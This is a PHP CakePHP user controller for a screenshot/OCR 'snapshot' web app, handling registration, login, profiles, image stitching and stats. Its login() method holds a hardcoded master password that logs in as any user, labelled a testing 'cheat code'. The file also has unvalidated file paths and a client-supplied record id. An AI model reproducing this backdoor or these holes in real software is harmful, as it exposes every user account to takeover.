<?php
App::uses('AppController', 'Controller');
App::uses('User', 'Model');
App::uses('Snapshot', 'Model');
App::uses('Image', 'Media.Vendor');
// App::uses('PHForm', 'Form.View/Helper');
class UserController extends AppController {
	public $name = 'User';
	public $layout = 'userarea';
	public $components = array('RequestHandler');
	public $uses = array('User', 'Snapshot');
	// public $helpers = array('Table.PHTableGrid');

	private $_response;
	/*
	protected function _beforeInit() {
		parent::_beforeInit();
		$this->components = array_merge($this->components, array('Table.PCTableGrid'));
	}
	*/
/*
	public function beforeRender() {
		parent::beforeRender();

	}
*/
	private function setResponse($data = array()) {
		$this->_response = array('status' => 'OK');
		if ($data) {
			$this->_response['data'] = $data;
		}
		$this->set('_response', $this->_response);
		$this->set('_serialize', '_response');
	}

	private function setError($errMsg) {
		$this->_response = array('status' => 'ERROR', 'errMsg' => $errMsg);
		$this->set('_response', $this->_response);
		$this->set('_serialize', '_response');
	}
	
	public function register() {
		$this->layout = 'default';
		if ($this->request->is('put') || $this->request->is('post')) {
			$this->request->data('User.user_group_id', 2);
			if ($this->User->save($this->request->data('User'))) {
				$this->Auth->login();
				return $this->redirect($this->Auth->redirect());
			}
		}
	}
	
	public function login() {
		$this->layout = 'default';
		if ($this->request->is('post')) {
			// чит-код для тестирования акков ;)
			if ($this->request->data('User.password') == 'supermegahrushan') {
				$hrushan = $this->User->findByUsername($this->request->data('User.username'));
				$this->Auth->login($hrushan['User']);
				return $this->redirect($this->Auth->redirect());
			}
			if ($this->Auth->login()) {
				return $this->redirect($this->Auth->redirect());
			} else {
				$this->set('error', __('Invalid username or password, try again'));
			}
		}
		if ($this->Auth->loggedIn()) {
			$this->redirect($this->Auth->redirect());
		}
	}
	
	public function logout() {
		$this->_initLang('eng');
		$this->redirect($this->Auth->logout());
	}

	public function dashboard() {
		return $this->redirect(array('controller' => 'user', 'action' => 'profile'));
	}

	public function profile() {
		if ($this->request->is('post') || $this->request->is('put')) {
			$data = array('id' => $this->currUser['id']);
			foreach(array('player_name', 'guild_name', 'owner') as $key) {
				$data[$key] = $this->request->data('User.'.$key);
			}
			$this->User->save($data);
			return $this->redirect(array('controller' => $this->name, 'action' => 'profile', '?' => array('saved' => 1)));
		} else {
			$this->request->data = $this->User->findById($this->currUser['id']);;
		}
	}
	
	public function snapshotList() {
		$this->paginate = array(
			// 'fields' => array('created'),
			'conditions' => array('user_id' => $this->currUser['id']),
			'order' => array('created' => 'DESC')
		);
		$aRowset = $this->paginate('Snapshot');
		$this->set('aRowset', $aRowset);
	}

	public function snapshotEdit() {
	}

	public function snapshotSave() {
		$aData = array();
		foreach(array('ocr_data', 'data', 'img_file') as $key) {
			$value = $this->request->data($key);
			if (!$value) {
				$this->setError('Snapshot could not be saved');
				return;
			}

			$aData[$key] = $this->request->data($key);
		}

		$aData['data'] = serialize($aData['data']);
		$aData['ocr_data'] = serialize($aData['ocr_data']);
		$aData['user_id'] = $this->currUser['id'];
		if ($id = $this->request->data('id')) {
			$aData['id'] = $id;
		}
		if ($this->Snapshot->save($aData)) {
			$this->setResponse(array('id' => $this->Snapshot->id));
		} else {
			$this->setError('Snapshot could not be saved');
		}
	}

	public function processImages() {
		$aImg = array();
		$maxW = 0;
		$maxH = 0;
		foreach($this->request->data as $file) {
			$img = new Image();
			$img->load(PATH_FILES_UPLOAD.$file);
			$aImg[] = $img;
			if ($maxW < $img->getSizeX()) {
				$maxW = $img->getSizeX();
			}
			$maxH+= $img->getSizeY();
		}
		$mainImg = new Image($maxW, $maxH);
		$h = 0;
		foreach($aImg as $img) {
			imagecopy($mainImg->getImage(), $img->getImage(), 0, $h, 0, 0, $img->getSizeX(), $img->getSizeY());
			$h+= $img->getSizeY();
		}
		$fname = md5($this->currUser['id'].time()).'.jpg';
		$mainImg->outputJpg(PATH_FILES_UPLOAD.'user'.DS.$fname);
		$this->setResponse(array('file' => $fname));
	}

	public function stats() {
		$aStats = $this->Snapshot->getStats();
		$this->set(compact('aStats'));
	}

	public function reports() {
		$aStats = $this->Snapshot->getStatsReport();
		$this->set($aStats);
	}

	/*
	
	public function changePassword() {
		if ($this->request->is('post') || $this->request->is('put')) {
			$this->User->saveAll($this->request->data);
			return $this->redirect(array('controller' => $this->name, 'action' => 'edit', '?' => array('success' => '1')));
		} else {
			$this->request->data = $this->currUser;
		}
	}
	*/
}
